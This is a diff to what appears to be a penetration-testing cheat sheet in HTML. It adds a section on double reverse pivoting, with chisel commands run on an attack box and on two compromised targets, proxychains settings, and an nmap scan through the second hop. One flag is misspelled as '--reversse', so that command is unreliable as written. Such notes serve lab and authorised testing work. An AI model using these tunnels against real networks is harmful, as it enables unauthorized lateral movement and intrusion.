@@ -268,6 +268,29 @@ chisel client &lt;attack_machine_IP&gt;:&lt;attack_machine_port&gt; R:socks
 proxychains nmap &lt;...&gt;
 
 <span class="c">################</span>
+<span class="c"># Double reverse pivoting with SOCKS5</span>
+<span class="c">################</span>
+
+<span class="c"># In /etc/proxychains4.conf, have two lines ready for double hop:</span>
+socks5  127.0.0.1 1080
+socks5  127.0.0.1 9999
+
+<span class="c"># On attack box, run the initial server:</span>
+chisel server <span class="nt">-v</span> <span class="nt">-p</span> 9050 <span class="nt">--socks5</span> <span class="nt">--reverse</span>
+
+<span class="c"># On first target, run the first client:</span>
+./chisel client 10.10.16.14:9050 R:socks
+
+<span class="c"># Still on first target, run the second server for second target:</span>
+./chisel server <span class="nt">-v</span> <span class="nt">-p</span> 9002 <span class="nt">--socks5</span> <span class="nt">--reversse</span>
+
+<span class="c"># On second target, run second client:</span>
+.<span class="se">\c</span>hisel.exe client &lt;first target IP&gt;:9002 R:9999:socks
+
+<span class="c"># On attack box, check that double hop is working:</span>
+proxychains nmap <span class="nt">-sT</span> <span class="nt">-p</span> 22 &lt;reachable IP through second target only&gt;
+
+<span class="c">################</span>
 <span class="c"># Bind pivoting with SOCKS5</span>
 <span class="c">################</span>
 
